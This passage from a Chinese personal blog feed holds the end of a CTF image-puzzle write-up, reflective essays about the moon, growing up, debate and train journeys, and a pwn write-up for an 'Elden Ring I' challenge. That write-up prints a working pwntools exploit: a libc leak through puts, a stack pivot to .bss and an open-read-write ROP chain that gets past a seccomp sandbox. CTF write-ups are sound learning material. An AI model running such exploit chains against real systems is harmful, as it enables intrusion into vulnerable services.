class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            img1 = img[:, :x]</span><br><span class="line">            img2 = img[:, x + <span class="number">1</span>:]</span><br><span class="line">            img = cv2.hconcat([img1, img2])</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">39</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p += <span class="number">6</span></span><br><span class="line">        img1 = img[:, :p]</span><br><span class="line">        img2 = img[:, p + <span class="number">8</span>:]</span><br><span class="line">        img = cv2.hconcat([img1, img2])</span><br><span class="line">    <span class="comment"># 再切y</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            img1 = img[:y, :]</span><br><span class="line">            img2 = img[y + <span class="number">1</span>:, :]</span><br><span class="line">            img = cv2.vconcat([img1, img2])</span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">39</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p += <span class="number">7</span></span><br><span class="line">        img1 = img[: p, :]</span><br><span class="line">        img2 = img[p + <span class="number">6</span>:, :]</span><br><span class="line">        img = cv2.vconcat([img1, img2])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    filename = <span class="string">f&quot;flag<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line">    img0 = cv2.imread(filename)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        img = split4db(img=img0, flag=(j + <span class="number">1</span>))</span><br><span class="line">        savename = <span class="string">f&quot;rctf<span class="subst">&#123;(i + <span class="number">1</span>) * <span class="number">4</span> - j&#125;</span>.png&quot;</span></span><br><span class="line">        cv2.imwrite(savename, img)</span><br></pre></td></tr></table></figure></div>

<p>结果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/11img_3.png"
                      alt="11img_3"
                ></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>为了维持干净的wp,把一些思路还是放在后面<br>所以在这个答案之前，我也有过这样的想法：</p>
<blockquote>
<p>去根据灰度标记每个白色小方格标志为[0,1,2,3,4]<br>中一个，来表示这个块有几个字母，因为每个图其实都有一个能看出来的字母，然后把这个字母所在方格的标志减掉一，然后反向操作，从标志到灰度，再看看有什么能看出来的字符。</p>
</blockquote>
<p>当然，这个思路弊端很明显：</p>
<ul>
<li>没有顺序信息</li>
<li>把看的出结果的方格减一很难做得很准确，尤其是在文字边缘</li>
<li>更有可能出现把已知得字符减去之后，找不到新的字符的情况</li>
</ul>
<p>所以放弃这个思路，更仔细的去看每一块的内容，或许cv的题真的可以从出题的角度去看题，从这个题是怎么构成出出来的考虑。<br>于是就想到要去看看具体每一块的内容。</p>
<p>完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。<br>题的脚本不是很难构造，想到就是想到，很misc的一道题</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>Misc</tag>
        <tag>CV</tag>
      </tags>
  </entry>
  <entry>
    <title>今夜月升影重重</title>
    <url>/2024/06/04/%E4%BB%8A%E5%A4%9C%E6%9C%88%E5%8D%87%E5%BD%B1%E9%87%8D%E9%87%8D/</url>
    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
<blockquote>
<p>其实本来说的是<code>白鸟</code>里不会有其他的博客了<br>但想想，还是想写点东西<br><code>白鸟</code>里无论是诗还是文都真假参半，不要代入作者，至于哪些是真的这种问题她高兴了可能会说的</p>
</blockquote>
<h3 id="今夜月升影重重"><a href="#今夜月升影重重" class="headerlink" title="今夜月升影重重"></a>今夜月升影重重</h3><p>&emsp;&emsp;如果能割掉一半的脑子，是不是就不会总是想那些不着边际的东西了。</p>
<p>&emsp;&emsp;我常常这样想。</p>
<br>

<p>&emsp;&emsp;今夜无月，也可能是云层太厚了看不见。我不懂地理，算不对能看见月亮的时间，也找不到它在东边还是西边。总之今夜我并没看见月亮，却傻傻想了很久的月亮。</p>
<p>&emsp;&emsp;月亮是我学会的第一个意象。印象深刻到以至于每次想要借月亮寄托一些个人而又晦涩的情感时，都会回想起初中语文老师的那节课堂。他说月亮就是古代人的卫星，正因相隔两地的人都能看到月亮，就把自己的情思寄给月亮，这样无论距离多远，月亮都能帮你送到。</p>
<p>&emsp;&emsp;那时我还喜欢着一个女孩，可惜等我发现这份爱意时已经不在同一个城市了。我害怕自己不过是标新立异，便也没有和谁提起过这份感情，也包括她。不上台面的爱也要有个出口，于是我时常幼稚地向月亮表达深深浅浅的思念与爱慕，后来逐渐演变成了对着月亮祈祷。有一次大白天，不过是放学在等公交车，习惯性地抬头看看天，都觉得能活在同一片蓝天下真是美好。</p>
<p>&emsp;&emsp;可现在已经是21世纪了，月亮已经送不到我的信了。从某天起，我对她的爱就这样畸形又怪异地转移到月亮，但她依然是我的一片轻轻的残念，我的白月光。</p>
<p>&emsp;&emsp;我无法向一直不爱我的人输送无穷的爱意，故而我有时也难以理解所谓亲情。从某种理性上来讲，他们没道理爱上像拖油瓶一样的小孩，除非有个未来的盼头，例如这个小孩未来有点出息还能回馈三分什么的。我当然不怀疑我的父母是为了从我身上捞到那三分回馈才爱我，只是，只是人总要有点盼头。爱的目光洒落肩头，一连生活琐碎的沉重。</p>
<p>&emsp;&emsp;或许是借宿时期留下的坏习惯，我喜欢去看一个人的过去，更喜欢猜测他的未来，尽管这些统统与我无关。但这确曾是无聊生活里为数不多的趣事，更是寄人篱下的护身法宝。后来，我只会觉得是自己多事。</p>
<p>&emsp;&emsp;尽管对月亮的痴念发生在寄宿生活之后，但那时我总爱和她聊这段当时无法释怀的时光。说是聊，也不过就是找一个夜晚，一个人静静地望着她，心里暗自抱怨自己如今多余的敏感和无用的多情，让我知道不该知道的，好奇不用好奇的，怜悯无需怜悯的，谦卑过分谦卑的。</p>
<p>&emsp;&emsp;一个人只是站在我面前就好，那些过去的故事便会一刻不停的从我的脑海里蹦出。我停不下对别人过去的窥探，仿佛知道的多一点就能获得更多的安全感。我那样讨厌被别人注视，却无时无刻不在注视别人。</p>
<p>&emsp;&emsp;说起讨厌注视，应当是厌烦了目光后的感情。就像被阅读理解折磨疯了的考生咬文嚼字地解读他能见到的每一句话，我的每一段生活场景都仿佛接入了同声传译，批上细致的情感注脚。我也被折磨疯了。我猜旁人本无意流露什么或者已经打算隐瞒什么。但视线言语里的情绪蓄势待发，从见面那刻就开始向我涌来。他们身上生活的压力，失意的落魄，得意的潇洒；他们期待我独立，担忧我弱小，嫌弃我无力；他们敷衍我、哄骗我、轻视我，还有那样纯粹的爱我，全都直白的，原原本本的在我耳边播放，一句一句刺痛我。</p>
<p>&emsp;&emsp;从知道的这一刻起，我就忍不住地在意。我真恨我是小孩，好似暴雨袭来，而我不过是只能低空盘旋的蜻蜓。</p>
<p>&emsp;&emsp;我向月亮许愿，要快快长大。</p>
<p>&emsp;&emsp;我舍不得这超能力一样的敏感，去他的多情又如何，去他的烦恼又如何，这是我每晚去找月亮的路标。我偏执的认为，长大就是缓解年少惆怅的良药，在还没有到达的未来里，有关于生活的一切答案。如果我能满足期待，如果我能证明自己，如果我能不用再去听他们的，如果我长大了。我想我是一个延迟满足的高手，有无穷的耐心去等待一个满意的回答，等待长大后的我去一件一件回应曾经无能为力的介怀。</p>
<p>&emsp;&emsp;人总要有点盼头，长大就是我的盼头。</p>
<p>&emsp;&emsp;月亮有没有帮我完成愿望，我不知道。毕竟我对她只是简单的自然崇拜，不贪图什么。这样简单的诞生于文学的崇拜，一点也比不上东北对于灰黄狐白柳那样的信仰。除了月亮，文学也让我崇拜上许多其他，只是月，是我最亲近，最喜爱的那位。月光轻飘飘的，没有重量。我从不觉得月亮注视着我，但我知道，当我看向她时，她也在认真看向我。</p>
<p>&emsp;&emsp;但我的确早早长大了，身边的家人朋友都这样评价我。可是月亮啊，为什么没有人来庆祝我的长大。</p>
<p>&emsp;&emsp;在意识到我长大的刹那，我分明看到我妈眼底下的不是我，是年轻的她自己，夹杂着几分人老无用的哀伤。在奔波于两个城市的路途上，我明明总听她讲，要是我长大了就好了，就不用她烦心了。原来满足别人的期待和期待被满足，可以同时让人失落。或许，我是说或许，长大本身，就是一件扫兴的事吧。</p>
<p>&emsp;&emsp;我提前站在了我的未来里，但却没有找到什么解药。过去寄宿生活旁观偏爱的落寞，摇摆阴暗又失败的爱慕，还有一次又一次的沉默被从旧账里找出来，却发现长大的我也没机会为小孩呐喊了。我能做的就是用长大的眼界去看淡，再苦大仇深、惊心动魄、津津乐道的故事，只要翻篇了，都只剩轻描淡写三两句。原来长大，就是把过去珍重的变可笑。</p>
<p>&emsp;&emsp;而那些梦想中长大才能获得的尊重或是自由的底气，真拥有时才发现，原来和长大没有关系。不用学会懂事，不用学会察言观色，不用多沉稳，只要你还有一点点孩子气，只要你多在乎你自己一点。</p>
<p>&emsp;&emsp;我恨我自己，原来我和那些无聊的大人一样，厌恶小孩、轻视小孩，所以才拼命远离小孩的身份。我恨我自己，提前长大，让我变得死寂而沉闷。兜兜转转，那个不尊重小孩的人，是我。</p>
<p>&emsp;&emsp;我就这样，竟然就这样，自然而然地走到了月亮的反面，没有被光照过的那一面。我是什么时候开始长大的？是我下定决心许愿那天？还是情感的注脚出现的那一天？还是开始窥探揣摩别人的那一天？还是，更早？</p>
<p>&emsp;&emsp;我不知道。</p>
<p>&emsp;&emsp;我常常这样想。</p>
<br>

<p>&emsp;&emsp;在长大后的很久很久以后，我才知道，当年我垂涎的并不是长大。就像我没那么爱吃章鱼小丸子，每次吃都是因为上面的木鱼花反复挑逗着我。而木鱼花其实和章鱼小丸子关系没有好到非得绑定出现，这个道理直到我的上颚被烫掉薄薄一层皮才认识到。心急的人，理所应当的受到惩罚。</p>
<p>&emsp;&emsp;月亮像钩子，拖出来一段长长长长的故事。更像毛衣上的线头，你不知道这一拉是千里决堤的溃散，还是越拉越紧的死结，或者，一个小玩笑。</p>
<p>&emsp;&emsp;月亮啊月亮，今晚再和你说说话，能让我变小孩吗？过去的梦里，我还有宝藏没找到。</p>
]]></content>
      <tags>
        <tag>白鸟</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次栈迁移|Hgame2024-Elden Ring I</title>
    <url>/2024/05/24/%E6%87%92%E5%BE%97%E5%96%B7/</url>
    <content><![CDATA[<p>( ºΔº )</p>
<p>很有意义的一次做题，尤其对我这种。。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>按照流程应该先看一下保护和文件信息，但是因为我是知道答案找过程所以就略过。</p>
<p>然后看ida,找一下洞<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/1.png"
                      alt="img.png"
                ><br>看到开了沙箱，禁用了一些系统调用<br>然后进函数看<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/2.png"
                      alt="img.png"
                ><br>申请了100h空间写东西，但是允许你写130h，非常清楚的栈溢出，给了30h的操作空间</p>
<p>所以大概思路就是要用orw这样也能读到flag,然后30h写不下,所以需要一块可写的地方，还有足够的长度和写的指令。</p>
<p>看到vuln里面有read(),所以写的指令可以直接借这个。放orx的地方就选择可读可写的bss段，那么就要栈迁移一下。</p>
<p>好，那么exp的思路应该是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">第一次leave ret：溢出一下，改变rbp旧址，移动栈底，把read()的写入地址改成bss,回到read()</span><br><span class="line">第二次leave ret：借read（）把orw写进新的栈之后会经过leave ret,然后自然而然rsp找rbp,ret到栈顶。</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>新的栈相当于全部都是可以利用的，所以基本不担心写不写得下orw。<br>然后来看需要的地址(除了ida能找到的和pwntools可以直接读到的)和代码片段：</p>
<ul>
<li>pop_rax_ret</li>
<li>pop_rdi_ret</li>
<li>pop_rsi_ret</li>
<li>pop_rdx_ret</li>
<li>open_addr</li>
<li>read_addr</li>
<li>write_addr</li>
</ul>
<p>然后去找了一下代码片段<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/3.png"
                      alt="img.png"
                ><br>啊这根本不够用，而且知道open_addr也需要libc基址<br>所以显然再加一步泄露libc基址，啊因为这个题还是比较温柔的，vuln里一共就一个puts(),一个read(),很明显这个用过的puts()<br>可以拿来got表泄露一下。<br>我们已经能够控制rdi了，30h也足够把puts()泄露了</p>
<p>所以payload的思路就是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次read:溢出泄露puts()拿到puts()的物理地址，回到函数</span><br><span class="line">    然后减去偏移泄露libc,算一下需要的地址，以及代码片段的位置</span><br><span class="line">第二次read:溢出改变rbp旧址，控制rax,回到read（）</span><br><span class="line">第三次read:写入orw</span><br></pre></td></tr></table></figure></div>

<p>好的下面是exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">##ida里直接找的</span></span><br><span class="line">ret_add=<span class="number">0x40125B</span></span><br><span class="line">bss_add=<span class="number">0x404090</span></span><br><span class="line"><span class="comment">##ROPgadget</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4013e3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次read</span></span><br><span class="line">payload=(<span class="number">0x108</span>)*<span class="string">b&#x27;A&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(ret_add)</span><br><span class="line">payload=payload.ljust(<span class="number">0x130</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;accord.&quot;</span>,payload)      </span><br><span class="line">p.recvline()    </span><br><span class="line">p.recvline()  </span><br><span class="line"></span><br><span class="line"><span class="comment">#算基址                              </span></span><br><span class="line">puts_add=u64(p.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_add-<span class="number">0x84420</span>  <span class="comment">##0x84420是puts在libc里的偏移，这个东西有两种来法，写在后面力</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base=&quot;</span>,<span class="built_in">hex</span>(libc_base),<span class="string">&quot;puts_add=&quot;</span>,<span class="built_in">hex</span>(puts_add))</span><br><span class="line"></span><br><span class="line"><span class="comment">#算需要的地址</span></span><br><span class="line">pop_rax_ret=<span class="number">0x0000000000036174</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x000000000002601f</span>+libc_base</span><br><span class="line">pop_rdx_ret=<span class="number">0x0000000000142c92</span>+libc_base</span><br><span class="line">open_add=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_add=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_add=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次read</span></span><br><span class="line">payload=<span class="number">0x100</span>*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(bss_add-<span class="number">0x8</span>)<span class="comment">##rbp</span></span><br><span class="line">payload+=p64(pop_rax_ret)</span><br><span class="line">payload+=p64(bss_add)</span><br><span class="line">payload+=p64(<span class="number">0x401282</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;accord.&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第三次read</span></span><br><span class="line"><span class="comment">#orw 从0x404090开始</span></span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(<span class="number">0x404128</span>)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(<span class="number">3</span>)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(<span class="number">0x404140</span>) <span class="comment">##0x404128+hex(16)=0x404138</span></span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(<span class="number">1</span>)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(<span class="number">0x404140</span>)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload1+=p64(write_add)</span><br><span class="line">payload1+=<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span><span class="comment">#0x404090+hex(19*8)=0x404128</span></span><br><span class="line">payload1+= p64(<span class="number">0</span>)*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="一些问题复现与小知识"><a href="#一些问题复现与小知识" class="headerlink" title="一些问题复现与小知识"></a>一些问题复现与小知识</h3><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>个人理解就是栈顶找栈底，然后把栈底的旧址改了就能把栈迁移走。</p>
<p>那么第一次leave ret就是栈顶回到没有申请栈的时候，栈底移走<br>第二次leave ret就是栈顶到了新栈底的地方，控制流就跟着栈顶走了</p>
<h6 id="迁移到了哪？0x404090"><a href="#迁移到了哪？0x404090" class="headerlink" title="迁移到了哪？0x404090"></a>迁移到了哪？0x404090</h6><p>原计划是要迁移到bss段，但是我看到ida上bss的开始其实还要更早<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/4.png"
                      alt="img.png"
                ><br>而实际写进去的位置大概在prgend这里，呃呃查了一些资料感受不出来这俩有啥要可以区分的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/5.png"
                      alt="img_1.png"
                ><br>总之直接开调，先去vmmap里面只能看到数据段是从0x404000到0x405000很大一段<br>然后ida也能看到bss的起始地址，就试了一下把bss_add写得再小一点，是可以打通的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">bss_add=0x404068</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#orw 0x404090</span><br><span class="line">payload1=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(0x404100)</span><br><span class="line">payload1+=p64(pop_rsi_ret)</span><br><span class="line">payload1+=p64(0)</span><br><span class="line">payload1+=p64(open_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">payload1+=p64(pop_rdx_ret)</span><br><span class="line">payload1+=p64(0x100)</span><br><span class="line">payload1+=p64(read_add)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">payload1+=p64(0x404108)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>后来我又试了一下把orw写到data（0x404050开始）上在这个题目里也是可以打通的，不过再往前和got.plt（0x404000）开始就不ok了，应该是影响到了函数调用（？</p>
<h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><p>这个东西之前接触过，但是和这次的调用逻辑不太一样，，，但是函数传参那套还是在的<br>emmm主要调试了一下这个第二个参数传的地址的变化，open要开的是’flag‘的地址，就是[add]&#x3D;’flag’<br>,第一遍打通的时候其实没找准，主要是因为我用的最后一个gadget和参考的exp不一样长，然后填充长度也就不一样了。</p>
<p>所以后来改了一下，然后把计算过程写在前面的exp里了，也用<code>tele</code>调试了几种不同的情况。</p>
<h4 id="recv"><a href="#recv" class="headerlink" title="recv()"></a>recv()</h4><p>这个东西从我第一次打pwn到现在都在出问题（乐<br>首先这次是因为这个狗题puts(“…\n”)<br>然后recvline(keepends&#x3D;True)默认接收换行符，且是接收到换行符结束<br>recvuntil(delims, drop&#x3D;False),delims是字符串，drop表示是否丢弃中止标志<br>recv()接收指定字符长度</p>
<h4 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h4><h6 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h6><p>这个相对libc的偏移是固定的，只是libc的基址会变，所以可以取一次调试得到的装载后的地址<code>puts_add</code><br>-这一次的基址就是每一次的偏移。<br>这个x指令我不是很会用，就用p凑合凑合了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/6.png"
                      alt="img_2.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/eldenring1/7.png"
                      alt="img_3.png"
                ><br>然后十进制转一下十六进制。。</p>
<h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><p>但是我本来就在想，既然偏移是固定的，那pwntools为什么不能直接解析文件呢。<br>而且本来脚本就有：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">open_add=libc_base+libc.sym[&quot;open&quot;]</span><br><span class="line">read_add=libc_base+libc.sym[&quot;read&quot;]</span><br><span class="line">write_add=libc_base+libc.sym[&quot;write&quot;]</span><br></pre></td></tr></table></figure></div>

<p>这种东西，他们的偏移不就直接得出来。<br>然后我就试了一下这个</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(hex(libc.sym[&#x27;puts&#x27;]))</span><br></pre></td></tr></table></figure></div>

<p>返回0x84420，所以其实这玩意确实不用算。。</p>
<h4 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h4><p>装了一个工具，解决我只能硬看的问题</p>
<h4 id="一些其他小问题"><a href="#一些其他小问题" class="headerlink" title="一些其他小问题"></a>一些其他小问题</h4><p>调到这里大部分问题都没有了，比较可惜的是其实没有机会复现寒假出现的问题了，可能确实那个时候就是环境一开始因为各种问题就是配的烂，所以有很多莫名其妙的东西出现，现在这个环境是我五一的时候重装的，这一次从头到尾都配很丝滑，所以好像也没有换glibc,patchelf有问题等一系列的毛病。</p>
<p>希望能早点做到一个需要换环境的题，因为这个我真不会。</p>
<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>动态调试其实最重要的是我现在能理解到ret和pop了，之前不知道为什么就是对这两条指令的接收度不高，所以有些问题感觉都是好像懂了好像没懂。也可能是因为虽然代码写得多，但其实没怎么在实践中接触栈，对于栈顶的理解也不够深刻maybe.</p>
]]></content>
      <tags>
        <tag>学习日志</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>火车摇啊摇</title>
    <url>/2024/05/07/%E4%BA%BA%E7%94%9F%E5%B0%8F%E6%BB%A1%EF%BC%8C%E6%97%A2%E6%98%AF%E5%9C%86%E6%BB%A1/</url>
    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
<p>收到“杭电后勤生活”的推文，明天是小满，师生驿站有活动，还配上了“人生小满，既是圆满”的文案。</p>
<p>一时感慨，想到之前想更的博客也没更，索性一并抒发了。</p>
<h6 id="一"><a href="#一" class="headerlink" title="一"></a>一</h6><p>最先当说的应是高中生活，本就是这句“人生小满，既是圆满”一下把我的思绪拉到了高中。</p>
<p>差不多去年今日，准备高考时买了一本作文书里面收录了一些和我调性相符还算认可的高考作文，这里还算认可的意思大概是说写得细腻，在限时考试的背景下我仍能从里面看到些许的文字的斟酌或者追求。</p>
<p>扯远了，这样显得我写东西多清高了，不过文人相轻是常态嘛，也该轮到我清高清高了。</p>
<p>那时读到有一篇议论文的立意就是“人生小满，既是圆满”，也一样是从节气、自然讲到人生，佐以中华传统文化等素材一道写的饱满充实。不过可能到现在我还是就记住了“人生小满”，也可能当时那些辞藻、结构、渲染就没看进去，当时神经衰弱（现在也神经衰弱）压力挺大的，也就只能看见“人生小满”。</p>
<h6 id="二"><a href="#二" class="headerlink" title="二"></a>二</h6><p>说到压力大，我前段时间压力就还蛮大的，忙到天天被迫熬夜还看了两次凌晨四点的杭电，不过我还是忙里偷闲会写博客，反而五一忙完了就一直在睡觉或者打打游戏，总之称不上多有营养。</p>
<p>在忙的时候，时常想着忙完了就狠狠更新博客，把这天上地下的都点评一番，我对象挺不能理解为什么我这么喜欢写博客，还要催他去开一个。除了可以偷窥他在干什么，对我而言博客的意义是这里的确是我可以把心剖开了的地方。这里是如同群聊一样的私域链接，也不会像群聊一样提示你谁更新了，后悔了也能直接撤了文章。我清楚地知道谁可能会看，我也不介意，能知道这个地址的朋友若是有心关心我，来看看我我也挺乐意的。</p>
<h6 id="三"><a href="#三" class="headerlink" title="三"></a>三</h6><p>原本想要写的一篇，名字就叫“火车摇啊摇”，也就是现在这篇的名字。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic/%E6%9D%AD%E5%B7%9E%E5%8D%97.png"
                      alt="img.png"
                ></p>
<p>许久不坐绿皮车了，但我以前坐的实在多，以至于一上车闻到那股淡淡烟草味混合着微生物腐臭味的气息时，回忆能一下冲垮了我推论的思路。下午的正赛有点难打，我们是劣势持方，从结果评委的点评来看，我们的言辞需要更精准，论证需要更多环节，要将辩题外的东西来围猎对面，也需要讲辩题外的东西为什么可以讲。对于正方，他们只要简单的讲讲自己就好。</p>
<p>我从没有为一场辩论模辩过三次，写四五千字的稿子，甚至于失掉辩论的自信。</p>
<p>在此之前，我一直认为，辩论是一件我擅长却不敢兴趣的事，如果生活不冲突的话，在自己擅长的地方大杀四方当然畅快，但是如果冲突了，那我当然不会忙不感兴趣的事了。</p>
<p>不过这“最后一场辩论”，让我连是否擅长辩论都不太确信了。或许是我的前置位队友不够给力，让我每次发言都很难受；或许是来找我的学姐言辞凛然，让我总觉得自己做得不够好；或许是真的就是太难了，这个辩题在网上你都找不到一场我方持方打赢的视频…………</p>
<p>这“最后一场辩论”里我的表现，自我感觉是不好的。我问学长，“感觉我今天打的还没新生杯的时候好”，学长说，“怎么会呢，辩论肯定是越打越好的”。</p>
<p>火车摇啊摇，胡思乱想。</p>
<p>绿皮车的气味真是难闻，坐了几十上百次我还是没适应。如果不是我把一周半准备三个辩题误以为一周半准备一个辩题，我应当也不会接下这场全国范围的竞技辩，也不会退掉五一回上海的车票，而买了偏远的杭州南为了确保一定能在下午前到嘉兴比赛。</p>
<p>杭州南，好像都是绿皮车。</p>
<p>我记得以前在嘉兴-上海的绿皮车上，我也总爱胡思乱想，过去想想没写完的作业就像现在想想没推完的论，就连不知所措和时间紧迫的焦虑也大差不差。</p>
<h6 id="四"><a href="#四" class="headerlink" title="四"></a>四</h6><p>输了辩论，但和辩论队的纠葛很难完全了断。</p>
<p>协会的学长其实都觉得这是没什么大不了的小事，脸皮厚一点就好了。</p>
<p>但我是个耳根子软的人，旁人随意说两句，我很容易就在意。就像现在准备转专业一样，原本坚定了一个半学期，但是有人在我面前真诚的说上两句，加上一个我确实没考虑过的角度，我就很听劝的开始咨询转专业。</p>
<p>这种无条件无意义的在意，除了让我费神之外，也给我加上了一层社交体面的被动。“火车摇啊摇”，其实是朋友圈的真心话版，而朋友圈，只是宣告离别辩论的社交仪式。</p>
<h6 id="五"><a href="#五" class="headerlink" title="五"></a>五</h6><p><em>*上传的时候发现这里被我手滑空格删掉了，那就这样吧，本来这段写的也不好,弥补的事少做一点，前进的事多做一点</em></p>
<h6 id="六"><a href="#六" class="headerlink" title="六"></a>六</h6><p>人生小满，既是圆满。</p>
<p>有感触还是因为觉得最近也算人生小满，说人生太大了，要把眼光放的局限一点，再局限一点。</p>
<p>我5号染了个还不错的头，小满。</p>
]]></content>
      <tags>
        <tag>喵喵</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>不定时更新小诗</title>
    <url>/2024/05/13/%E7%99%BD%E9%B8%9F%E8%BF%87%E6%B2%B3%E6%BB%A9/</url>
    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
<p>重新排了一下顺序，越新的诗靠的越前</p>
